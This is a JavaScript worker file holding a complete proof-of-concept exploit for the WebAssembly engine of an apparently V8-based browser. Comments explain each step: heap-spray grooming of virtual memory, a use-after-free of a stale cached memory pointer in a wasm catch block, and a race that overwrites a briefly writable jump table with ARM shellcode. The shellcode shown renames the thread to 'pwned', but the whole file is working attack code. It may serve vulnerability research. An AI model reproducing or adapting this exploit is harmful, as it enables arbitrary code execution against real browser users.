function log(msg) {
  postMessage(msg);
}

/*
 * Sets the worker's thread name to "pwned"
 */
let shellcode = [
  -382926717, //   push {r0, r1, r7}
  -476053489, //   mov r0, #15 // PR_SET_NAME
  -493940724, //   adr r1, comm
  -476024660, //   mov r7, #0xac // prctl
  -285212672, //   svc #0
  -390266749, //   pop {r0, r1, r7}
  -369098751, //   b end
              // comm:
  1701738352, //   "pwne"
  100         //   "d\0\0\0"
              // end:
];

class Buffer {
  constructor() {
    this.buf = new Uint8Array(128);
    this.off = 0;
  }

  len() {
    return this.off;
  }

  data() {
    return this.buf.subarray(0, this.off);
  }

  ensure(n) {
    let len = this.buf.length;
    let need = this.off + n;
    if (need > len) {
      let len2 = Math.max(need, len * 2);
      let buf2 = new Uint8Array(len2);
      buf2.set(this.buf);
      this.buf = buf2;
    }
  }

  u8(v) {
    this.ensure(1);
    this.buf[this.off++] = v;
  }

  u32(v) {
    for (let i = 0; i < 4; i++) {
      this.u8(v & 0xff);
      v >>= 8;
    }
  }

  varint(v, n) {
    v = BigInt(v)
    while (n > 0) {
      let b = v & 0x7fn;
      v >>= 7n;
      n -= 7;
      if (n > 0)
        b |= 0x80n;
      this.u8(Number(b));
    }
  }

  signext(v, fr, to) {
    v = BigInt(v);
    fr = BigInt(fr);
    to = BigInt(to);
    if (v & (1n << (fr - 1n))) {
      let mask = ((1n << (to - fr)) - 1n) << fr;
      v |= mask;
    }
    return Number(v);
  }

  svarint(v, n) {
    let n2 = Math.floor((n + 6) / 7) * 7;
    v = this.signext(v, n, n2);
    this.varint(v, n2);
  }

  u32v(v) {
    this.varint(v, 32);
  }

  i32v(v) {
    this.svarint(v, 32)
  }

  i33v(v) {
    this.svarint(v, 33);
  }

  str(s) {
    this.u32v(s.length);
    for (let i = 0; i < s.length; i++)
      this.u8(s.charCodeAt(i));
  }

  add_buf(buf) {
    this.ensure(buf.len());
    this.buf.set(buf.data(), this.off);
    this.off += buf.len();
  }

  rep_buf(buf, n) {
    let ch = new Uint8Array(buf);
    this.ensure(ch.length * n);
    for (let i = 0; i < n; i++) {
      this.buf.set(ch, this.off);
      this.off += ch.length;
    }
  }
}

let type_section_code = 1;
let import_section_code = 2;
let function_section_code = 3;
let memory_section_code = 5;
let export_section_code = 7;
let code_section_code = 10;
let name_section_code = 12;
let tag_section_code = 13;

class WasmBuilder {
  constructor() {
    this.sigs = [];
    this.imps = [];
    this.funcs = [];
    this.excs = [];
    this.impsect = null;
    this.num_imps = 0;
  }

  add_import(mod, func) {
    let sig = this.get_sig(0, 0);
    this.imps.push({mod:mod, func:func, sig:sig});
    this.num_imps++;
  }

  set_import_section(impsect, num) {
    this.num_imps = num;
    this.impsect = impsect;
  }

  set_mem(init, max) {
    this.mem = {init:init, max:max};
  }

  add_exc_tag(nm) {
    let sig = this.get_sig(0, 0);
    this.excs.push({nm:nm, sig:sig});
  }

  u8(v)   { this.cur.u8(v); }
  u32(v)  { this.cur.u32(v); }
  u32v(v) { this.cur.u32v(v); }
  i32v(v) { this.cur.i32v(v); }
  i33v(v) { this.cur.i33v(v); }
  str(s)  { this.cur.str(s); }
  add_buf(b) { this.cur.add_buf(b); }

  header() {
    let magic = 0x6d736100;
    let version = 1;
    this.u32(magic);
    this.u32(version);
  }

  sect(code) {
    this.u8(code);
    this.cur = new Buffer();
  }

  endsect() {
    let s = this.cur;
    this.cur = this.buf;
    this.u32v(s.len())
    this.add_buf(s);
  }

  get_sig(params, rets) {
    let sigs = this.sigs;
    for (let i = 0; i < sigs.length; i++) {
      let sig = sigs[i];
      if (sig.params == params && sig.rets == rets)
        return i;
    }
    sigs.push({params:params, rets:rets});
    return sigs.length - 1;
  }

  rep_7f(n) {
    for (let i = 0; i < n; i++)
      this.u8(0x7f);
  }

  sig(params, rets) {
    this.u8(0x60);
    this.u32v(params);
    this.rep_7f(params);
    this.u32v(rets);
    this.rep_7f(rets);
  }

  type_section() {
    this.sect(type_section_code);
    let sigs = this.sigs;
    this.u32v(sigs.length);
    for (let i = 0; i < sigs.length; i++) {
      let sig = sigs[i];
      this.sig(sig.params, sig.rets);
    }
    this.endsect();
  }

  import_section() {
    this.sect(import_section_code);
    let impsect = this.impsect;
    if (impsect != null) {
      this.add_buf(impsect);
    } else {
      let imps = this.imps;
      this.u32v(imps.length);
      for (let i = 0; i < imps.length; i++) {
        let imp = imps[i];
        this.str(imp.mod);
        this.str(imp.func);
        this.u8(0);   /* function */
        this.u32v(imp.sig);
      }
    }
    this.endsect();
  }
  
  function_section() {
    this.sect(function_section_code);
    let funcs = this.funcs;
    this.u32v(funcs.length);
    for (let i = 0; i < funcs.length; i++)
      this.u32v(funcs[i].sig);
    this.endsect();
  }

  memory_section() {
    this.sect(memory_section_code);
    this.u32v(1); /* memory count */
    this.u8(1);   /* flags = withmaximum */
    this.u32v(this.mem.init);
    this.u32v(this.mem.max);
    this.endsect();
  }

  tag_section() {
    this.sect(tag_section_code);
    let excs = this.excs;
    this.u32v(excs.length);
    for (let i = 0; i < excs.length; i++) {
      this.u32v(0); /* exception attribute (ignored) */
      this.u32v(excs[i].sig);
    }
    this.endsect();
  }

  export(nm, type, idx) {
    this.str(nm);
    this.u8(type);
    this.u32v(idx);
  }

  export_section() {
    this.sect(export_section_code);
    let funcs = this.funcs;
    let excs = this.excs;
    let num_exp = funcs.length + excs.length + 1;
    this.u32v(num_exp);
    let funoff = this.num_imps;
    for (let i = 0; i < funcs.length; i++)
      this.export(funcs[i].nm, 0, funoff++);
    for (let i = 0; i < excs.length; i++)
      this.export(excs[i].nm, 4, i);
    this.export('memory', 2, 0);
    this.endsect();
  }

  init_locals(locals) {
    this.u32v(locals ? 1 : 0); /* max 1 entry */
    if (locals) {
      this.u32v(locals);
      this.u8(0x7f); /* i32 */
    }
  }

  beginfunc(nm, params, rets, locals) {
    let sig = this.get_sig(params, rets);
    this.funcs.push({nm:nm, sig:sig});
    this.cur = new Buffer();
    this.init_locals(locals);
  }

  endfunc() {
    this.end();
    let code = this.cur;
    let funcs = this.funcs;
    funcs[funcs.length - 1].code = code;
  }

  op_u32v(op, v) {
    this.u8(op);
    this.u32v(v);
  }

  get_local(idx) {
    this.op_u32v(0x20, idx);
  }

  set_local(idx) {
    this.op_u32v(0x21, idx);
  }

  call_func(idx) {
    this.op_u32v(0x10, idx);
  }

  loop() {
    this.u8(0x03);
    this.i33v(-0x40); /* void */
  }

  brif() {
    this.op_u32v(0x0d, 0 /* innermost block */);
  }

  i32eq() {
    this.u8(0x46);
  }

  do_try() {
    this.u8(0x06);
    this.i33v(-0x40); /* void */
  }

  do_catch(idx) {
    this.op_u32v(0x07, idx);
  }

  i32const(c) {
    this.u8(0x41);
    this.i32v(c);
  }

  i32_mem_op(opc) {
    this.u8(opc);
    this.u32v(2); /* alignment */
    this.u32v(0); /* offset */
  }

  i32_load_mem() {
    this.i32_mem_op(0x28);
  }

  i32_store_mem() {
    this.i32_mem_op(0x36);
  }

  end() {
    this.u8(0x0b);
  }

  code_section() {
    this.sect(code_section_code);
    let funcs = this.funcs;
    this.u32v(funcs.length);
    for (let i = 0; i < funcs.length; i++) {
      let code = funcs[i].code;
      this.u32v(code.len());
      this.add_buf(code);
    }
    this.endsect();
  }

  build() {
    this.buf = new Buffer();
    this.cur = this.buf;
    this.header();
    this.type_section();
    this.import_section();
    this.function_section();
    this.memory_section();
    this.tag_section();
    this.export_section();
    this.code_section();
    return this.buf.data();
  }
}

function compile(mod) {
  return new WebAssembly.Module(mod);
}

function instantiate(mod, imp) {
  return new WebAssembly.Instance(mod, imp);
}

let GIG = 0x40000000;
let MEG = 0x100000;
let WASM_PG = 0x10000;

/*
 * The goal is to groom these three mmaps in descending order:
 *   ##
 *   small size noise slot
 *   ##
 *   medium size uaf slot
 *   ##
 *   large size grow slot
 *   ##
 * And all other holes <= small slot must be allocated. This sprays the whole
 * virtual memory space. PUhysical memory won't be mapped though. The slots will
 * be as large as possible to reduce noise.
 *
 * The exploit first frees the noise and uaf slots. Since the noise slot is
 * located above the uaf slot, it will be preferred by the kernel's topdown
 * allocator for any future noisy mmaps, leaving the uaf slot intact.
 *
 * Next, the exploit does the following:
 *   1. Allocate corruptor memory into uaf slot.
 *   2. Free grow slot.
 *   3. Grow corruptor memory past uaf slot's size. It can't grow in-place, so
 *      new memory is allocated into grow slot while uaf slot is freed.
 *   4. Allocate victim's code memory. It fits exactly into the uaf slot, so
 *      it's too big to go into the noise slot. And the topdown allocator will
 *      prefer the uaf slot over the grow slot.
 */
class Spray {
  constructor() {
    this.sprays = [];
    this.hole_alloc();
  }

  alloc(min, max) {
    min /= WASM_PG;
    max /= WASM_PG;
    return new WebAssembly.Memory({initial: min, maximum: max});
  }

  try_hole_alloc(sz) {
    try {
      return this.alloc(sz, sz);
    } catch (e) {
      if (!(e instanceof RangeError))
        throw e;
    }
    return null;
  }

  szstr(sz) {
    return (sz / MEG).toString() + 'm';
  }

  hole_alloc() {
    let sz = 512 * MEG;
    let hole = null;
    while (true) {
      hole = this.try_hole_alloc(sz);
      if (hole)
        break;
      sz /= 2;
    }
    log('got ' + this.szstr(sz) + ' hole');
    this.smallsz = sz / 32;
    this.midsz = sz / 16;
    this.largesz = sz / 8;
    this.hole = hole;
  }

  get_ms() {
    return performance.now();
  }

  alloc_time(spr, sz) {
    let tm1 = this.get_ms();
    spr.push(this.alloc(WASM_PG, sz));
    let tm2 = this.get_ms();
    return tm2 - tm1;
  }

  spray_sz(sz, min, max) {
    log('spray ' + this.szstr(sz) + '...');
    let spr = [];
    let thres = 3; /* ms */
    let hicnt = 0;
    /*
     * Falling back to smaller sizes takes above 3 ms.
     */
    try {
      for (let i = 0; i < max; i++) {
        let ms = this.alloc_time(spr, sz);
        if (ms > thres)
          hicnt++;
        else
          hicnt = 0;
        if (hicnt >= 3 && i + 1 >= min)
          break;
      }
    } catch (err) {
      log('spray err at ' + spr.length + ': ' + err);
    }
    this.sprays.push(spr);
    return spr;
  }

  free(spr, idx) {
    let len = spr.length;
    if (idx >= len)
      throw 'bad free ' + idx + '/' + len;
    spr.splice(idx, 1);
  }

  spray() {
    let max = 4 * GIG / this.smallsz;
    var ret = this.spray_sz(this.smallsz, 20, max);
    log('smalls=' + ret.length + '/' + max);
    delete this.hole;
    this.small = this.spray_sz(this.smallsz, 8, 8);
    this.mid   = this.spray_sz(this.midsz, 4, 4);
    this.large = this.spray_sz(this.largesz, 4, 4);
    this.spray_sz(this.smallsz, 0, 200);
  }

  free_small() {
    this.free(this.small, 5);
  }

  free_mid() {
    this.free(this.mid, 1);
  }

  free_large() {
    this.free(this.large, 1);
  }

  uafsz() {
    return this.midsz;
  }

  free_all() {
    for (var i = 0; i < this.sprays.length; i++) {
      let spr = this.sprays[i];
      spr.splice(0, spr.length);
    }
  }
}

class Exploit {
  build_bad_func(w) {
    w.beginfunc('bad', 0, 0, 1);

    /* Populate cached memory start pointer */
    w.i32const(0);
    w.i32_load_mem();
    w.set_local(0);

    w.do_try();
      /* Call thrower() JS import */
      w.call_func(0);
    w.do_catch(0);
      /*
       * The thrower() grew our memory. This allocated a new memory and freed
       * the old one. Then it groomed the victim code in the freed slot. And
       * then it threw an exception, triggering a bug where this catch block
       * still points to old memory.
       *
       * The victim code is currently W^X and it's only compiled by liftoff.
       * Grab the jump table pointer to func 3 (the `ret` function).
       */
      let ret_off = 3 * 12 + 8;
      w.i32const(ret_off);
      w.i32_load_mem();
      w.set_local(0);
      /*
       * In 100 ms, the main thread triggers a tier-up of `ret`. This marks the
       * jump table temporarily RWX and rewrites the `ret` pointer to the
       * tiered-up version. Wait for that in a busy loop.
       */
      w.loop();
      w.i32const(ret_off);
      w.i32_load_mem();
      w.get_local(0);
      w.i32eq();
      w.brif();
      w.end();
      /*
       * Now the jump table is RWX for a bit of time. Enough to overwrite it
       * with our shellcode.
       */
      for (var i = 0; i < shellcode.length; i++) {
        w.i32const(i * 4);
        w.i32const(shellcode[i]);
        w.i32_store_mem();
      }
    w.end();
    w.endfunc();
  }

  make_corruptor() {
    let w = new WasmBuilder();
    let uafsz = this.spray.uafsz();
    /*
     * Why 4 / 3 * uafsz?
     *
     * The thrower() function will grow this memory. And this grow must not
     * occur in-place. It must move in order to replace it with victim code for
     * UAF. The initial memory allocation will try to reserve whole maxsz. Our
     * grooming leaves a single uafsz slot, so 4 / 3 * uafsz attempt fails. Next
     * attempt will be 3 / 4 * maxsz = uafsz, which fits exactly into the
     * groomed slot.
     *
     * Next, thrower() will grow it to uafsz + 1 page. This request is less than
     * maxsz, so grow proceeds. There's no room to grow in-place though, so new
     * memory is allocated and old is freed, allowing us to UAF old memory.
     */
    let maxsz = Math.floor((uafsz / WASM_PG) * 4 / 3);
    w.set_mem(1, maxsz);
    w.add_import('mod', 'thrower');
    w.add_exc_tag('ex');
    this.build_bad_func(w);
    return w.build();
  }

  align_up(v, a) {
    return (v + a - 1) & ~(a - 1);
  }

  /*
   * Victim's initial code allocation should be uafsz. The size estimation is
   * quite complicated. But most importantly, we can specify a large number of
   * imports. Each one needs 6 wire bytes and increases the estimate by 550
   * bytes.
   */
  calc_nimp() {
    let nfunc = 4;
    let codesz = 17 * nfunc - 5;
    let lazysz = 20 * nfunc;
    let turbosz = Math.floor((60 * nfunc + 3 * codesz) / 4);
    let liftsz = 112 * nfunc + 5 * codesz;
    let nruntime = 95;
    let jumpsz = this.align_up(nfunc * 12, 32);
    let ljumpsz = this.align_up(nruntime * 8, 32);
    let impsz = 550;
    let tot = this.spray.uafsz();
    let nimp = Math.floor((tot - jumpsz - ljumpsz - lazysz - liftsz - turbosz - 32) / impsz);
    return nimp;
  }

  build_huge_imports(w) {
    let num = this.calc_nimp();
    let sig = w.get_sig(0, 0);
    /* a.b() */
    let one = [0x01, 0x61, 0x01, 0x62, 0x00, sig];
    let imp = new Buffer();
    imp.u32v(num);
    imp.rep_buf(one, num);
    w.set_import_section(imp, num);
  }

  num_jump_slots() {
    let n = shellcode.length;
    if (n % 3)
      throw 'shellcode not multiple of slot size';
    return n / 3;
  }

  make_victim() {
    let w = new WasmBuilder();
    w.set_mem(1, 1);
    this.build_huge_imports(w);
    for (var i = 0; i < this.num_jump_slots(); i++) {
      /*
       * Victim functions, whose jump slots will be overwritten by corruptor.
       * Invoking f0() will call our shellcode.
       */
      w.beginfunc('f' + i, 0, 1, 0);
      w.i32const(43);
      w.endfunc();
    }
    /*
     * The shellcode returns by jumping to the jump table entry of ret(). So if
     * f0() returns 42, then shellcode succeeded. The ret, aka func 3 is also
     * the function that's tiered-up to get RWX.
     */
    w.beginfunc('ret', 0, 1, 0);
    w.i32const(42);
    w.endfunc();
    this.victim = w.build();
  }

  turbofan_bad(next) {
    let imp = {'mod': {'thrower': function() {}}};
    let inst = instantiate(this.corruptor, imp);
    /*
     * Trigger TurboFan tier-up. Because the UAF bug is in the TurboFan-compiled
     * code.
     */
    for (let i = 0; i < 10000; i++)
      inst.exports.bad();
    /* 300 ms for tier-up to finish */
    setTimeout(next, 300);
  }

  compile_corr(next) {
    this.corruptor = compile(this.make_corruptor());
    this.turbofan_bad(next);
  }

  compile_vict() {
    this.victmod = compile(this.victim);
    /*
     * Triggers parallel TurboFan in 100 ms, which temporarily sets the jump
     * table RWX. So bad func's catch block can write our shellcode there.
     */
    postMessage(this.victmod);
  }

  thrower() {
    /*
     * Make space for grow to succeed.
     */
    this.spray.free_large();
    /*
     * Growing moves the memory and frees the old uafsz region.
     */
    let mem = this.corr.exports.memory;
    let uafsz = this.spray.uafsz();
    mem.grow(uafsz / WASM_PG);
    if (mem.buffer.byteLength != uafsz + WASM_PG)
      throw 'huh, grow failed';
    /*
     * The victim module has a huge imports section and reserves exactly uafsz
     * bytes for the code region. This re-maps the freed memory. Also schedule
     * victim for a parallel tier-up to get RWX.
     */
    this.compile_vict();
    /*
     * Trigger the bug. The wasm TurboFan code uses old cached memory pointer in
     * the catch region when a called function throws. This now points to the
     * groomed victim module, which can be written during tier-up...
     */
    throw new WebAssembly.Exception(this.corr.exports.ex, []);
  }

  trigger() {
    /*
     * The small hole is located above the mid hole, so kernel's topdown
     * allocator prefers it for any noise mmaps, leaving our mid hole intact.
     */
    this.spray.free_small();
    /*
     * A single mid size (uafsz) hole within the whole virtual space.
     */
    this.spray.free_mid();
    /*
     * Place corruptor memory in the uafsz hole. Its maximum is 4/3*uafsz, which
     * doesn't fit anywhere. The next try is 3/4 max, which is exactly uafsz.
     * Since the whole maximum wasn't reserved, then growing the memory
     * past uafsz will have to move the memory instead of growing in-place.
     */
    let imp = {'mod': {'thrower': this.thrower.bind(this)}};
    this.corr = instantiate(this.corruptor, imp);
    /*
     * And off we go. See build_bad_func() above.
     */
    this.corr.exports.bad();
    log('wrote shellcode into victim');
  }

  launch_sc() {
    let vict = instantiate(this.victmod, {a:{b:function() {}}});
    if (vict.exports.f0() == 42) {
      log('shellcode ran');
      log('check `$ ps -AT | grep pwned`');
    } else {
      throw 'huh, shellcode failed';
    }
  }

  do_run() {
    this.spray.spray();
    this.trigger();
    this.spray.free_all();
    this.launch_sc();
    /*
     * Make sure this thread stays alive, so name change can be checked.
     */
    while (1) ;
  }

  run() {
    log('run worker');
    this.spray = new Spray();
    this.make_victim();
    this.compile_corr(this.do_run.bind(this));
  }
}

(new Exploit()).run();
